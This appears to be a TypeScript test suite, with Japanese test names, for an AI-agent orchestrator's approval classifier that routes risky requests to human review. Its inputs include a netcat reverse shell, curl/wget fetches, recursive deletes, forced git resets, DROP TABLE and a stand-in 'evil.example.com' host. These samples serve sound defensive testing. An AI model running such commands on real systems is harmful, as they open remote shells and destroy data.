import { describe, expect, it } from 'vitest';

import {
  classifyApprovalRequest,
  DANGER_PATTERN_IDS,
  normalizeCommand,
  type EscalationPolicy,
  type EscalationRequest,
  type NetworkPolicyAmendment,
  type TaskBoundary,
} from '../../src/orchestrator/escalation';

const boundary = (
  allowedRoots: string[],
  gitCommonDir: string | undefined = undefined,
): TaskBoundary => ({
  allowedRoots,
  gitCommonDir,
});

const defaultBoundary = (): TaskBoundary => boundary(['/repo/work']);

const policy = (overrides: Partial<EscalationPolicy> = {}): EscalationPolicy => ({
  escalate: [],
  allow: [],
  autoApprove: true,
  ...overrides,
});

interface CommandRequestOverrides {
  networkApprovalContext?: { host: string; protocol: string };
  proposedNetworkPolicyAmendments?: NetworkPolicyAmendment[];
  proposedExecpolicyAmendment?: string[];
}

const commandRequest = (
  command: string,
  cwd = '',
  overrides: CommandRequestOverrides = {},
): EscalationRequest => ({
  kind: 'command',
  command,
  cwd,
  paths: [],
  networkApprovalContext: overrides.networkApprovalContext,
  proposedNetworkPolicyAmendments: overrides.proposedNetworkPolicyAmendments ?? [],
  grantRoot: undefined,
  proposedExecpolicyAmendment: overrides.proposedExecpolicyAmendment ?? [],
});

const fileChangeRequest = (
  paths: string[],
  grantRoot: string | undefined = undefined,
): EscalationRequest => ({
  kind: 'fileChange',
  command: '',
  cwd: '',
  paths,
  networkApprovalContext: undefined,
  proposedNetworkPolicyAmendments: [],
  grantRoot,
  proposedExecpolicyAmendment: [],
});

const permissionsRequest = (): EscalationRequest => ({
  kind: 'permissions',
  command: '',
  cwd: '',
  paths: [],
  networkApprovalContext: undefined,
  proposedNetworkPolicyAmendments: [],
  grantRoot: undefined,
  proposedExecpolicyAmendment: [],
});

const unknownRequest = (): EscalationRequest => ({
  kind: 'unknown',
  command: '',
  cwd: '',
  paths: [],
  networkApprovalContext: undefined,
  proposedNetworkPolicyAmendments: [],
  grantRoot: undefined,
  proposedExecpolicyAmendment: [],
});

describe('classifyApprovalRequest: 削除・巻き戻し', () => {
  it.each(['rm -rf /repo/work/tmp', 'rm -fr /repo/work/tmp', 'sudo rm -rf /repo/work/tmp'])(
    '再帰的な強制削除はaskになる: %s',
    (command) => {
      const result = classifyApprovalRequest(commandRequest(command), defaultBoundary(), policy());
      expect(result.decision).toBe('ask');
    },
  );

  it('git cleanの強制実行（追跡外ファイルの一括削除）はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('git clean -fd'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('git reset --hardなど作業ツリーの強制巻き戻しはaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('git reset --hard HEAD'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('git checkout -f も作業ツリーの強制巻き戻しとしてaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('git checkout -f main'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('ブランチの削除はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('git branch -D old-feature'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('タグの削除はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('git tag -d v1.0.0'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('テーブルの削除（DROP TABLE）はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('psql -c "DROP TABLE users"'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('テーブルの全消去（TRUNCATE）はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('psql -c "TRUNCATE users"'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('find -delete はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('find . -name *.tmp -delete'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('find -exec はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('find . -type f -exec chmod 644 {} +'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: 外部へ出る操作', () => {
  it.each(['--force', '-f', '--force-with-lease'])('強制push（%s）はaskになる', (flag) => {
    const result = classifyApprovalRequest(
      commandRequest(`git push ${flag} origin main`),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('リモートブランチの削除pushはaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('git push origin --delete old-branch'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it.each([
    'curl https://example.com/script.sh',
    'wget https://example.com/x',
    'nc -e /bin/sh 10.0.0.1 4444',
  ])('外部へ到達しうるコマンドはaskになる: %s', (command) => {
    const result = classifyApprovalRequest(commandRequest(command), defaultBoundary(), policy());
    expect(result.decision).toBe('ask');
  });

  it('デプロイ・パッケージ公開のコマンドはaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('npm publish --access public'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: デコード・間接実行', () => {
  it('base64 -d はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('base64 -d encoded.txt -o out.bin'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('xxd -r はaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('xxd -r hex.txt out.bin'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: シェルメタ文字', () => {
  it.each([
    ['セミコロンで連結', 'echo hello; echo world'],
    ['パイプで連結', 'echo hello | grep hello'],
    ['&&で連結', 'echo hello && echo world'],
    ['コマンド置換$()を含む', 'echo $(whoami)'],
    ['バッククォートによるコマンド置換を含む', 'echo `whoami`'],
    ['改行で連結', 'echo hello\necho world'],
  ])('%s コマンドはaskになる', (_label, command) => {
    const result = classifyApprovalRequest(commandRequest(command), defaultBoundary(), policy());
    expect(result.decision).toBe('ask');
    expect(result.reasons.some((r) => r.includes('シェルメタ文字'))).toBe(true);
  });
});

describe('classifyApprovalRequest: 安全なコマンドはautoになる', () => {
  it.each(['npm test', 'npm run build', 'pytest', 'go test ./...', 'echo hello'])(
    '%s はautoになる',
    (command) => {
      const result = classifyApprovalRequest(commandRequest(command), defaultBoundary(), policy());
      expect(result.decision).toBe('auto');
    },
  );

  it('autoのときも判定の理由が含まれる', () => {
    const result = classifyApprovalRequest(commandRequest('npm test'), defaultBoundary(), policy());
    expect(result.reasons.length).toBeGreaterThan(0);
  });
});

describe('classifyApprovalRequest: 作業ディレクトリ・worktreeの境界', () => {
  it('worktreeの外を指す絶対パス（command の cwd）への書き込みはaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('npm test', '/other/place'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
    expect(result.reasons.some((r) => r.includes('境界外'))).toBe(true);
  });

  it('worktree配下への書き込み（command の cwd）はautoになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('npm test', '/repo/work/sub'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('auto');
  });

  it('worktreeの外を指す絶対パス（fileChange）への書き込みはaskになる', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/other/place/file.txt']),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('worktree配下への書き込み（fileChange）はautoになる', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/src/file.ts']),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('auto');
  });

  it('..を使って境界の外へ出るパスはaskになる', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/sub/../../outside/file.txt']),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('境界パスの前方一致だけで通ってしまう紛らわしいパスはaskになる（/repo に対する /repo-evil/x）', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo-evil/x/file.txt']),
      boundary(['/repo']),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: .gitディレクトリ', () => {
  it('worktree配下の.gitへの書き込みはaskになる', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/.git/hooks/pre-commit']),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
    expect(result.reasons.some((r) => r.includes('.git'))).toBe(true);
  });

  it('allowを指定しても.gitへの書き込みはaskのまま', () => {
    const allowEverything = Object.values(DANGER_PATTERN_IDS);
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/.git/hooks/pre-commit']),
      defaultBoundary(),
      policy({ allow: allowEverything }),
    );
    expect(result.decision).toBe('ask');
  });

  it('親リポジトリの共有.git領域（gitCommonDir）への書き込みもaskになる', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/.git/hooks/pre-commit']),
      boundary(['/repo-worktrees/task1'], '/repo/.git'),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: permissions種別', () => {
  it('permissions種別は常にaskになる', () => {
    const result = classifyApprovalRequest(permissionsRequest(), defaultBoundary(), policy());
    expect(result.decision).toBe('ask');
  });

  it('allowを指定してもpermissions種別はaskのまま', () => {
    const result = classifyApprovalRequest(
      permissionsRequest(),
      defaultBoundary(),
      policy({ allow: ['permissions', ...Object.values(DANGER_PATTERN_IDS)] }),
    );
    expect(result.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: 未知の種別', () => {
  it('種別が未知の要求はaskになる', () => {
    const result = classifyApprovalRequest(unknownRequest(), defaultBoundary(), policy());
    expect(result.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: コマンド文字列の欠落（判定に失敗した要求）', () => {
  it('commandが空文字のcommand種別要求はaskになる', () => {
    const result = classifyApprovalRequest(commandRequest(''), defaultBoundary(), policy());
    expect(result.decision).toBe('ask');
  });

  it('commandが空白のみのcommand種別要求はaskになる', () => {
    const result = classifyApprovalRequest(commandRequest('   '), defaultBoundary(), policy());
    expect(result.decision).toBe('ask');
  });

  it('allowを指定してもcommand欠落はaskのまま', () => {
    const result = classifyApprovalRequest(
      commandRequest(''),
      defaultBoundary(),
      policy({ allow: Object.values(DANGER_PATTERN_IDS) }),
    );
    expect(result.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: networkApprovalContext（構造化されたネットワーク到達申告）', () => {
  it('無害に見えるコマンドでもnetworkApprovalContextがあればaskになり、理由にhostを含む', () => {
    const result = classifyApprovalRequest(
      commandRequest('some-internal-tool sync', '', {
        networkApprovalContext: { host: 'evil.example.com', protocol: 'https' },
      }),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
    expect(result.reasons.some((r) => r.includes('evil.example.com'))).toBe(true);
  });

  it('proposedNetworkPolicyAmendmentsにallowが含まれればaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('some-internal-tool sync', '', {
        proposedNetworkPolicyAmendments: [{ action: 'allow', host: 'example.com' }],
      }),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
  });

  it('proposedNetworkPolicyAmendmentsがdenyのみならこの条件では影響しない', () => {
    const result = classifyApprovalRequest(
      commandRequest('npm test', '', {
        proposedNetworkPolicyAmendments: [{ action: 'deny', host: 'example.com' }],
      }),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('auto');
  });

  it('allow: external-egress を指定すればnetworkApprovalContextがあってもautoになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('some-internal-tool sync', '', {
        networkApprovalContext: { host: 'example.com', protocol: 'https' },
      }),
      defaultBoundary(),
      policy({ allow: [DANGER_PATTERN_IDS.externalEgress] }),
    );
    expect(result.decision).toBe('auto');
  });

  it('escalateと併存しても壊れない（escalateが優先してaskになる）', () => {
    const result = classifyApprovalRequest(
      commandRequest('some-internal-tool sync', '', {
        networkApprovalContext: { host: 'example.com', protocol: 'https' },
      }),
      defaultBoundary(),
      policy({
        allow: [DANGER_PATTERN_IDS.externalEgress],
        escalate: ['some-internal-tool'],
      }),
    );
    expect(result.decision).toBe('ask');
    expect(result.reasons.some((r) => r.includes('escalate'))).toBe(true);
  });
});

describe('classifyApprovalRequest: grantRoot（セッション残り全体への書き込み許可要求）', () => {
  it('grantRootが設定されているとaskになり、理由にrootを含む', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/src/file.ts'], '/repo/work'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
    expect(result.reasons.some((r) => r.includes('/repo/work'))).toBe(true);
  });

  it('allowを何指定してもgrantRootはaskのまま', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/src/file.ts'], '/repo/work'),
      defaultBoundary(),
      policy({ allow: Object.values(DANGER_PATTERN_IDS) }),
    );
    expect(result.decision).toBe('ask');
  });

  it('grantRootが無ければこの条件では影響しない', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/src/file.ts'], undefined),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('auto');
  });
});

describe('classifyApprovalRequest: proposedExecpolicyAmendment（以後の無確認実行の提案）', () => {
  it('提案が付いていれば、それ自体は無害なコマンドでもaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('npm test', '/repo/work', {
        proposedExecpolicyAmendment: ['npm', 'test'],
      }),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('ask');
    expect(result.reasons.some((r) => r.includes('npm test'))).toBe(true);
  });

  it('allowを何指定しても解除できない', () => {
    // 対象が特定のホストやカテゴリではなくコマンド全般に及ぶため、
    // externalEgressのような個別のallowでは緩められない
    const result = classifyApprovalRequest(
      commandRequest('npm test', '/repo/work', {
        proposedExecpolicyAmendment: ['npm', 'test'],
      }),
      defaultBoundary(),
      policy({ allow: Object.values(DANGER_PATTERN_IDS) }),
    );
    expect(result.decision).toBe('ask');
  });

  it('提案が無ければ無害なコマンドはautoのまま', () => {
    const result = classifyApprovalRequest(
      commandRequest('npm test', '/repo/work'),
      defaultBoundary(),
      policy(),
    );
    expect(result.decision).toBe('auto');
  });
});

describe('classifyApprovalRequest: escalate', () => {
  it('escalateに足したパターンに一致するとaskになる', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/production-secrets.json']),
      defaultBoundary(),
      policy({ escalate: ['production-secrets.json'] }),
    );
    expect(result.decision).toBe('ask');
    expect(result.reasons.some((r) => r.includes('escalate'))).toBe(true);
  });

  it('escalateに一致しなければ他の停止条件が無い限りautoのまま', () => {
    const result = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/readme.md']),
      defaultBoundary(),
      policy({ escalate: ['production-secrets.json'] }),
    );
    expect(result.decision).toBe('auto');
  });
});

describe('classifyApprovalRequest: allow', () => {
  it('allowで外したパターンはautoになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('rm -rf /repo/work/tmp'),
      defaultBoundary(),
      policy({ allow: [DANGER_PATTERN_IDS.recursiveForceDelete] }),
    );
    expect(result.decision).toBe('auto');
  });

  it('あるタスクのallowは他のタスク（allow無し）の判定に影響しない', () => {
    const command = 'rm -rf /repo/work/tmp';
    const allowedResult = classifyApprovalRequest(
      commandRequest(command),
      defaultBoundary(),
      policy({ allow: [DANGER_PATTERN_IDS.recursiveForceDelete] }),
    );
    const otherTaskResult = classifyApprovalRequest(
      commandRequest(command),
      defaultBoundary(),
      policy(),
    );
    expect(allowedResult.decision).toBe('auto');
    expect(otherTaskResult.decision).toBe('ask');
  });
});

describe('classifyApprovalRequest: autoApprove', () => {
  it('autoApprove: false のとき、危険でない要求も含め全てaskになる', () => {
    const result = classifyApprovalRequest(
      commandRequest('npm test'),
      defaultBoundary(),
      policy({ autoApprove: false }),
    );
    expect(result.decision).toBe('ask');
  });

  it('autoApprove: false のとき、fileChangeもpermissionsもaskになる', () => {
    const fileChangeResult = classifyApprovalRequest(
      fileChangeRequest(['/repo/work/src/file.ts']),
      defaultBoundary(),
      policy({ autoApprove: false }),
    );
    const permissionsResult = classifyApprovalRequest(
      permissionsRequest(),
      defaultBoundary(),
      policy({ autoApprove: false }),
    );
    expect(fileChangeResult.decision).toBe('ask');
    expect(permissionsResult.decision).toBe('ask');
  });
});

describe('normalizeCommand', () => {
  it('文字列はそのまま返す', () => {
    expect(normalizeCommand('git status')).toBe('git status');
  });

  it('配列は空白区切りで結合する', () => {
    expect(normalizeCommand(['bash', '-lc', 'echo hi'])).toBe('bash -lc echo hi');
  });

  it('配列に文字列以外が混ざっていれば取り除いて結合する', () => {
    expect(normalizeCommand(['echo', 1, 'hi', null])).toBe('echo hi');
  });

  it('文字列でも配列でもなければ空文字を返す', () => {
    expect(normalizeCommand(undefined)).toBe('');
    expect(normalizeCommand(null)).toBe('');
    expect(normalizeCommand(42)).toBe('');
  });
});
